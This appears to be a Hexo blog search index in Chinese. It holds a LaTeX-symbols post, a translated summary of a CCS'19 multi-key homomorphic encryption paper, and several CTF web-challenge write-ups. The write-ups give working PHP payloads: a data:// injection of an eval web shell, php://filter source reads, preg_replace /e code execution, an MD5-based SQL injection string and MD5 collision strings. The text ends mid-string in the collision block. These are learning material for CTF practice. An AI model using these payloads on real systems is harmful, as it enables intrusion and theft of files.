<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>LaTeX常用符号</title>
    <link href="/2022/01/12/LaTeX%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/"/>
    <url>/2022/01/12/LaTeX%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0hurd7nj30hz05gmzd.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0iwqbipj30l50b8dkl.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0j96699j30m70ffagw.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jj0iubj30l70cbjwf.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jq9b2wj30ka06stb3.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0jxopg5j30iw0g810m.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ke2w2uj30jt08z77k.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0kml5r6j30hb068dh2.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ktjbqoj30pp0bs79c.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0l2hinaj30nb05pdhi.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0la0f9mj30kv04wdh4.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0lg44vdj30mc03b0ts.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0llz84tj30it0gp7es.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0ltudk8j30fd0c9jxk.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0m15qttj30iu0g2129.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0m7mr72j30gp07pwi6.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0mcw5zij30i707ztci.jpg" /></p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyb0mle0q3j30lt07vq7h.jpg" /></p><p>转自：https://blog.csdn.net/Ying_Xu/article/details/51240291</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CCS19</title>
    <link href="/2022/01/12/CCS19/"/>
    <url>/2022/01/12/CCS19/</url>
    
    <content type="html"><![CDATA[<center><big><strong>Efficient Multi-Key Homomorphic Encryption with Packed Ciphertexts with Application to Oblivious Neural Network Inference</strong></big></center><p><br></p><p><strong>摘要</strong><br><br>   同态加密（HE）是一个支持对密文数据进行操作的密码系统，lópez-Alt 等人提出了一个广义的HE概念，称为多密钥同态加密（MKHE），能够对不同密钥加密的密文执行算术运算。<br><br>   在本论文中，我们提出了两种基于压缩密文的多密钥HE方案变体。给出了新的重新线性化算法，比之前等人的方案更简单、更快。然后我们概况了HE的自举性技术，以得到多密钥全同态加密方案。使用Microsoft SEAL提供了两个MKHE方案的概念验证实现。例如，当基环的维数为8192时，与四方相关联的多密钥BGV密文之间的同态乘法以及随后的重新线性化大约用时116毫秒。<br><br>   我们的MKHE方案在多个数据提供者之间的安全计算中有着广泛的应用，作为基准，我们使用预训练的卷积神经网络模型对图像进行同态分类，其中输入数据和模型使用了不同的密钥进行加密。我们需要大约1.8秒来实现对MNIST数据集中一个加密图像的一个卷积层和两个完全连接的层的评估。</p><h1 id="介绍">1. 介绍</h1><p>  推动新的科学发现产生和使用了大量数据，有效并负责任地利用大数据仍然是一个巨大的挑战。这个问题可以通过外包给拥有密集计算资源的公共云服务提供商来缓解。但是，在外包数据分析的隐私和安全性方面仍然存在问题。在过去几年里，用于安全计算的密码技术已经取得了重大进展。在安全计算方面的技术中，多方计算（MPC）和同态加密（HE）由于技术上的突破而受到了越来越多的关注。<br><br>   MPC的历史可以追溯到三十年前，从那时起理论界就对其进行了深入研究。在多方计算中，两个或多个参与方参与协议交互，来对输入的私有数据进行计算，只有函数的输出会显示给参与方。近年来，人们在提高MPC的实际效率方面进行了大量的工作，最先进的协议在性能方面取得了数量级的改进。但是就通信复杂度而言，这些协议本质上仍然是低效的：协议期间，参与各方需要交换的比特数与函数的复杂性和参与方数目之间的乘积成正比。因此，高通信复杂度仍然是MPC协议的主要瓶颈。<br><br>   此外，上述MPC协议对于基于云的应用程序可能并不可取，因为所有相关方都需要执行与功能复杂性成比例的本地计算。但是在实际中，我们不能期望数据提供者在整个协议执行期间执行大量的工作或一直保持在线。因此提出了另一种模型，其中数据所有者与少量独立服务器私密地共享数据，这些服务器再执行MPC来生成计算结果。这些协议具有良好的性能，它们将负担从数据提供者转移到了服务器，但是它们的隐私保证依赖于服务器不相互串通的假设。<br><br>   HE指的是一种密码系统，允许在加密数据上进行计算，而无需解密数据，从而能够在不受信任的云中安全地外包计算。在Gentry首次构造后（基于理想格的全同态加密方案），HE的技术有了重大进步。例如，可以将多个明文值加密为单个压缩密文，并使用单指令多数据技术（SIMD）对这些值并行执行操作。因此，具有压缩技术的HE方案的每个明文值具有良好的摊销复杂度，并且已经被应用在隐私保护的大数据分析中。但是，传统的HE方案只允许计算同一密钥下可进行解密的密文。因此，HE并不支持存在多个数据提供者的安全计算应用程序，每个数据提供者都提供自己的密钥。<br><br>   lópez-Alt 等人提出了一种MKHE方案，它是一种密码原语，支持密文上的算术运算，而密文不要求需要使用同一密钥解密。除了解决上述HE的问题外，MKHE还可用于以最小的通信成本设计高效的MPC协议。此外，基于MKHE的MPC协议满足动态MPC属性，其中待评估的电路可以在数据提供者上传其加密数据后动态决定。<br><br>   尽管MKHE具有多功能性，但在实践中很少使用。早期的研究使用了GSW方案的多密钥变体。这些结构具有较大的密文，且它们的性能不能很好地随参与方的数量而扩展。以前的工作提出了短密文的MKHE方案，并警告一个密文只加密一个比特位。现在唯一的具有压缩密文的MKHE方案是BGV方案的多密钥变体。请注意，上述所有研究都是纯粹抽象的，没有给出实现，支持SIMD操作的MKHE方案是否可行仍然是一个悬而未决的问题。</p><h2 id="贡献">1.1 贡献</h2><p>  我们设计了BFV和CKKS方案的多密钥变体。提出了一种新的生成重新线性化密钥的方法，该方法比以前的技术更简单、更快。此外，我们将这些方案的最新自举算法应用于多密钥场景，以构建具有压缩密文的多密钥全同态加密。最后，我们给出了使用Microsoft SEAL实现的多密钥方案的概念证明，并给出了实验结果。据我们所知，这是第一个支持压缩密文的MKHE方案的实际实现。<br><br>   我们还提出了第一个可行的MKHE应用，能够安全地评估一个预训练卷积神经网络（CNN）模型。我们构造了一个高效的协议，其中云服务器使用模型提供者提供的分类器向数据所有者提供在线预测服务，同时使用MKHE保护数据和模型的隐私。我们的方案支持多密钥操作，因此可以在较低的端到端延迟下实现这一点，并且数据和模型提供者的成本接近最优（如图Fig.1）。服务器可以存储不同密钥加密的大量密文，但特定任务的计算成本仅取决于与电路相关的参与方的数量。我们注意到，我们的解决方案比单密钥HE具有优势， 因为ML模型提供者不需要将未加密的模型发送到服务器。</p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyayrs3t5vj30o108twgv.jpg" /></p><h2 id="构造概述">1.2 构造概述</h2><p>  设分圆环<span class="math inline">\(R=Z[X]/(x^{n}+1)\)</span>，<span class="math inline">\(s_{i}∈R\)</span>是第i方的秘密，构造基于环的MKHE方案的出发点是要求生成的方案能够在独立生成的密钥下处理密文上的同态计算。与K个不同方相关联的MKHE方案的密文形式为<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})∈R_{q}^{k+1}\)</span>，其中模数q可以由级联的密钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>解密。换句话说，其相位<span class="math inline">\(μ=&lt;\overline{ck},\overline{sk}&gt;(mod\ q)\)</span>是对应于基本方案的密文消息m的随机编码。<br><br>   BFV或CKKS的同态乘法包含两个步骤：张量积与再线性化。两个输入密文的张量积满足<span class="math inline">\(&lt;\overline{ct_{1}}\otimes\overline{ct_{2}},\overline{sk}\otimes\overline{sk}&gt;=&lt;\overline{ct_{1}},\overline{sk}&gt;·&lt;\overline{ct_{2}},\overline{sk}&gt;\)</span>，因此它是在<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>下的有效加密。在重新线性化步骤中，我们的目标是将扩展密文<span class="math inline">\(\overline{ct}=\overline{ct_{1}}\otimes\overline{ct_{2}}∈R_{q}^{(k+1)^{2}}\)</span>转换为在<span class="math inline">\(\overline{sk}\)</span>下加密相同消息的规范密文。此步骤可以理解为一个密钥切换过程，需要对<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>进行特殊加密。我们注意到，<span class="math inline">\(\overline{sk}\otimes\overline{sk}\)</span>包含依赖于两个不同方的项<span class="math inline">\(s_{i}s_{j}\)</span>。因此，与传统HE方案不同的是，与非线性项对应的重新线性化密钥不能由一方生成。<br><br>   我们提出了一种基于RLWE的密码系统来实现这一功能。它看起来类似于GSW的环形变体，但我们的方案支持不同密钥下密文之间的一些操作。设<span class="math inline">\(g∈Z_{d}\)</span>是积分向量，成为Gadget向量。该方案使用公共参考字符串模型CRS，各方共享一个随机多项式向量<span class="math inline">\(a∈R_{q}^{d}\)</span>。每一方自己生成一个特殊的对<span class="math inline">\(s_{i}\)</span>的加密，它是一个满足<span class="math inline">\(d_{i,0}+s_{i}·d_{i,1}≈r_{i}·g\ (mod\ q)\)</span>和<span class="math inline">\(d_{i,2}≈r_{i}·a+s_{i}·g\ (mod\ q)\)</span>的矩阵，其中<span class="math inline">\(r_{i}\)</span>是从密钥分布中采样的一个小多项式。它作为第i方的评估密钥被公布。<br><br>   我们提出了两种具有不同优点的再线性化方法。对于每一对<span class="math inline">\(1≤i,j≤k\)</span>，第一种方法将第i个评估密钥<span class="math inline">\(D_{i}\)</span>与第j个公钥<span class="math inline">\(b_{j}≈-s_{j}·a\ (mod\ q)\)</span>组合以生成<span class="math inline">\(K_{i,j}∈R_{q}^{d×3}，K_{i,j}·(1,s_{i},s_{j})≈s_{i}s_{j}·g\ (mod\ q)\)</span>。也就是说，<span class="math inline">\(K_{i,j}\)</span>可以用于将扩展密文的一项<span class="math inline">\(c_{i,j}\)</span>重新线性化为一个三元组<span class="math inline">\((c_{0}&#39;,c_{1}&#39;,c_{2}&#39;)，c_{0}&#39;+c_{i}&#39;s_{i}&#39;+c_{j}&#39;s_{j}&#39;≈c_{i,j}s_{i}s_{j}\ (mod\ q)\)</span>。这种方法可以视为先前GSW密文扩展的变体。特别的，<span class="math inline">\(K_{i,j}\)</span>的每一行由<span class="math inline">\(R_{q}\)</span>中的三个多项式组成，因此一个共享的重线性化密钥{<span class="math inline">\(K_{i,j}\)</span>}<span class="math inline">\(_{1≤i,j≤k}\)</span>的比特大小是<span class="math inline">\(O(dk^{2}·nlog\ q)\)</span>，密钥生成的复杂度是<span class="math inline">\(O(d^{2}k^{2})\)</span>多项式运算模q。重新线性化算法从<span class="math inline">\(s_{i,j}\)</span>到<span class="math inline">\((1,s_{i},s_{j})\)</span>重复<span class="math inline">\(O(k^{2})\)</span>密钥切换操作，因此它的复杂度是<span class="math inline">\(R_{q}\)</span>中的<span class="math inline">\(O(dk)^{2}\)</span>。我们注意到，<span class="math inline">\(K_{i,j}\)</span>可用于与第i方第j方相关的任何计算。<br><br>   我们的第二种方法通过递归方式将第j方的公钥<span class="math inline">\(b_{j}\)</span>与第i方的评估密钥<span class="math inline">\(D_{i}\)</span>相乘，直接将扩展密文的每一项线性化。第一个解决方案应该生成并存储一个共享的重新线性化密钥{<span class="math inline">\(K_{i,j}\)</span>}<span class="math inline">\(_{1≤i,j≤k}\)</span>，这使得它的空间和时间复杂度在k上二次增长。但是，第二种算法允许我们只保留在k上线性的个人评估密钥。此外，它还显著降低了重新线性化带来的附加噪声的方差，因此我们可以在保持相同功能的同时使用更小的参数。最后，我们将模数提升技术应用于第二种方法，以进一步降低噪声增长。<br><br>   作为一个正交问题，压缩MKHE方案的自举性在文献中还没有研究过。我们将现有的HE方案的自举方法推广到多密钥。推广的主要问题是，自举性的pipeline包含一些高级功能，如slot置换。我们通过将多密钥切换技术应用于Galois自同构，解决了这个问题并提供了所有必要的操作。<br><br>   最后，我们将最先进的优化技术应用于我们的MKHE方案，以实现对HE方案性能的改进。例如，我们实现了MKHE方案的剩余数系统（RNS）变体，并使用RNS友好的分解方法进行重新线性化，从而避免了昂贵的高精度算法。</p><h2 id="相关工作">1.3 相关工作</h2><p>  lópez-Alt 等人首先提出了一种基于NTRU的MKHE方案。之后Clear和McGoldrick提出了GSW的多密钥变体以及密文扩展技术来设计MKHE 方案，Mukherjee和Wichs对其进行了简化。Peikert和Shiehian在同一个多密钥GSW方案的基础上开发了两个multi-hop MKHE方案。但是，这些方案只能对大量的GSW扩展密文中的一个比特进行加密。<br><br>   Brakerski和Perlman提出了一种具有短密文（基于LWE）的MKHE方案，但其渐进/具体效率还没有得到明确的证明。Chen, Chillotti和Song在MKHE原语的首次实现中应用了TFHE框架，提出了一种改进方案。然而该方案不支持压缩技术，因此导致类似于TFHE的较大的膨胀率。<br><br>   最相关的研究是由Chen等人和li等人进行的。他们通过基于多密钥GSW方案生成重新线性化密钥来设计BGV的多密钥变体。但是，它由<span class="math inline">\(O(k^{2})\)</span>个密钥交换（从<span class="math inline">\(s_{i}s_{j}\)</span>切换到含有O(k)个分量的普通密钥）组成。此外，他们没有提供任何实施结果或关于具体性能的分析。我们的工作是这些研究的延伸，因为我们的重新线性化方法和其他优化技术也可以应用于BGV。我们还强调，通过观察评估键的稀疏性，可以提高以前MKHE方案的性能，但文章中并没有指明这一点。在表1中，我们提供了最近MKHE方案的表现；在我们的工作中用到了第二项进行比较。 <img src="http://tva1.sinaimg.cn/large/007aD2tWgy1gyb58pbp6rj30mj0a0jww.jpg" /></p><h1 id="背景">2. 背景</h1><h2 id="符号">2.1 符号</h2><p>  除非另有说明，否则所有对数均以2为底。用粗体表示向量，用大写粗体表示矩阵，用<span class="math inline">\(&lt;u,v&gt;\)</span>表示两个向量u、v的点积。对于实数r，⌊r⌉表示距离r最近的整数，在中间时向上取整。我们用x←D来表示根据分布D的采样x。对于有限集S，U(S)表示S上的均匀分布。在本文中，我们令λ表示安全参数，所有已知的针对作用域下加密方案的有效攻击都应该采取<span class="math inline">\(Ω(2^{λ})\)</span>位操作。</p><h2 id="多密钥同态加密">2.2 多密钥同态加密</h2><p>  多密钥同态加密是一种密码系统，它允许我们评估可能使用不同密钥加密的密文上的算数电路。<br><br></p><p>  设M为具有算数结构的消息空间。一个MKHE方案MKHE由五个算法组成（Setup，KeyGen，Enc，Dec，Eval）。我们假设每个参与方都有一个对其公钥和私钥的引用（索引）。多密钥密文隐式包含一组有序的关联规则<span class="math inline">\(T=\{id_{1},...,id_{k}\}\)</span>，例如，一个新密文ct ← MKHE.Enc(μ; <span class="math inline">\(pk_{id}\)</span>)对应一个元素集T = {id}，随着各方密文计算的进行，参考集的大小会越来越大。</p><ul><li>Setup：pp ← MKHE.Setup(<span class="math inline">\(1^{λ}\)</span>).将安全参数λ作为输入，并返回公共参数pp。我们假设所有其他算法都隐式地将pp作为输入。</li><li>KeyGeneration： (sk,pk) ← MKHE.KeyGen (pp). 输出一对公钥和私钥。</li><li>Encryption: ct ← MKHE.Enc(μ; <span class="math inline">\(pk_{id}\)</span>). 对明文μ∈M进行加密，输出密文ct ∈{0,1}*。</li><li>Decryption： μ ← MKHE.Dec(<span class="math inline">\(\overline{ct};\{sk_{id}\}\)</span><span class="math inline">\(_{id∈T}\)</span>). 给定具有相应私钥序列的密文，输出明文。</li><li>Homomorphic evaluation：<span class="math inline">\(\overline{ct}\)</span> ← MKHE.Eval(C,<span class="math inline">\((\overline{ct_{1}},...,\overline{ct_{\iota}})\)</span>,{pk<span class="math inline">\(_{id}\)</span>}<span class="math inline">\(_{id∈T}\)</span>).给定电路C、多密钥密文元组以及相应的公钥集，输出密文。其引用集是输入密文的引用集的并集。</li></ul><p>语义安全：</p>]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>FHE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF easy-伪协议</title>
    <link href="/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>题目直接给出了源码</p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9apna123j60r80cl75m02.jpg" /></p><p>一些新东西👇 open_basedir：将php所能打开的文件限制在指定的目录树中 pathinfo()：以数组的形式返回关于文件路径的信息(PATHINFO_DIRNAME - 只返回 dirname; PATHINFO_BASENAME - 只返回 basename; PATHINFO_EXTENSION - 只返回 extension; PATHINFO_FILENAME - 只返回 filename)</p><p>首先对$text进行了匹配，要求是字符串"how_to_bypass?"，可以利用伪协议进行写入 <code>data://text/plain,how_to_bypass?</code></p><p>继续对$file传入参数的后缀进行了检查，如果是php就进行文件包含，这里的绕过只需要在最后加一个.php就可以，很easy~</p><p>剩下的问题就是进行flag文件的读取了，现在我们是不知道flag所在文件的名称和路径的，我试着读了一下当前目录下的flag.php..失败了</p><p>这里看了大佬的博客，学到了新的知识=&gt;利用glob://伪协议进行目录遍历是可以无视open_basedir的</p><p><code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=var_dump(scandir('glob:///*'));</code></p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9brxnl0ej61ne0chjwk02.jpg" /></p><p>其实open_basedir对解这道题并没啥影响，flag文件就在当前目录下，所有直接用scandir('.')就能看到</p><p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9brhg4dxj61l0091ace02.jpg" /></p><p>得到文件名后就可以进行读取了，可以file_get_contents直接读 <code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=echo file_get_contents('fll11llaaaggg.php');</code></p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c3k8uqpj60it032t8u02.jpg" /></p><p>我真的是个憨批..这里读出的flag在源码里，我还以为没读到来回搞了好久，最后去问了出题人..给自己一锤😢</p><p>或者php://filter读取</p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c2kzk3ij61hw096ac902.jpg" /></p><p>解码得到flag</p>]]></content>
    
    
    <categories>
      
      <category>一些杂题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF ZJCTF不过如此</title>
    <link href="/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
    <url>/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    
    <content type="html"><![CDATA[<p>直接给出源码</p><p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9c9lvljyj60um0gadhl02.jpg" /></p><p>这里$text可以利用data伪协议写入，根据提示利用filter读取next.php <code>text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv9cciyy2ij61nz0cz41x02.jpg" /></p><p>解码得到next.php源码 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>这里读flag肯定要通过getFlag()函数，没什么思路去看了wp，学到很多新知识</p><p>⭐preg_replace(<span class="math inline">\(pattern,\)</span>replacement,<span class="math inline">\(subject)：在\)</span>subject中匹配<span class="math inline">\(pattern，并将其替换为\)</span>replacement /e修正符，$replacement中的字符串会被当作PHP代码执行 这里就提供给我们执行命令的机会，'strtolower("\\1")'会被当做PHP代码执行</p><p>⭐正则表达式中的'\\1'，其实就是转义后的'\1'，表示取出正则匹配后的第一个子匹配中的第一项 构造payload<code>\S%2b=phpinfo();</code> 这里，+表示匹配1或更多次，+就能匹配一个完整字符串了，URL传参的话+需要进行编码，否则会被认作空格</p><p>得到'strtolower("phpinfo();")' 传参进去后发现代码并没有被执行？</p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9cvepa7aj60yn08emya02.jpg" /></p><p>这里又涉及到一个PHP的小性质 ⭐在php中，双引号里面如果包含有变量，php解释器会进行解析；单引号中的变量不会被处理。 目前我们构造的payload最终执行时相当于=&gt;eval('strrolower("phpinfo();")');</p><p>⭐PHP可变变量<span class="math inline">\({\)</span>a} <code>\S%2b=$&#123;phpinfo()&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>BUU刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PHP伪协议</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF Easy_MD5</title>
    <link href="/2021/10/06/BJDCTF-Easy-MD5/"/>
    <url>/2021/10/06/BJDCTF-Easy-MD5/</url>
    
    <content type="html"><![CDATA[<p>1、打开是一个查询框，用burp发包看一下</p><p><img src="https://tvax4.sinaimg.cn/large/007aD2tWgy1gv5p06qjefj612208843202.jpg" /></p><p>在Response里有一句提示 <code>Hint: select * from 'admin' where password=md5($pass,true)</code></p><p>首先说明一下这个函数 👉md5(<span class="math inline">\(pass, true)：\)</span>pass是待加密字符串，第二个参数设为true，控制输出为原始16字符二进制格式</p><p>所以我们要想办法结合这个函数来进行SQL注入，这里看了大佬的wp，学习到一个类似万能密码的东东<code>ffifdyop</code></p><p>这个字符串经过md5加密后会输出一串<code>'or'6XXXXX</code>，结合查询语句 👉<code>select * from 'admin' where password = ''or'6XXXXX'</code> 后面的'6XXXXX'就等价于一个永真式，至此就绕过了md5函数，注入成功！</p><p>2、下面来到第二个界面，一句大大的Do you like MD5，那必然like..在源码里找到提示信息</p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv5pz39fwhj60l305gmxe02.jpg" /></p><p>这里涉及到PHP的'=='弱比较漏洞，如果进行比较的两个值类型不同，PHP会首先将其化为相同类型再进行比较，在处理哈希字符串时，它会把所有以'0e'开头的哈希值都解析为0，所以这里传两个哈希后'0e'开头的字符串即可</p><p>附上一些可用字符串： * QNKCDZO * 240610708 * s878926199a * s155964671a</p><p>也附上一个弱类型比较表给大家</p><p><img src="https://tva2.sinaimg.cn/large/007aD2tWgy1gv5q4kysamj61bg0riqp702.jpg" /></p><p>3、绕过成功，来到第三个界面</p><p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv5qizplz3j60tl07q3z202.jpg" /></p><p>'==='进行比较时，会判断值+类型，可以选择强碰撞或者md5数组绕过</p><p>PHP的md5()函数是无法处理数组的，在传入的参数为数组时会返回NULL，因此只需要传入两个不同值的数组，得到的结果就是'NULL === NULL'啦</p><p>强碰撞的话，这里给出几个md5值相同的字符串： <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$s1 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br>$s2 = <span class="hljs-string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br>$s3 = <span 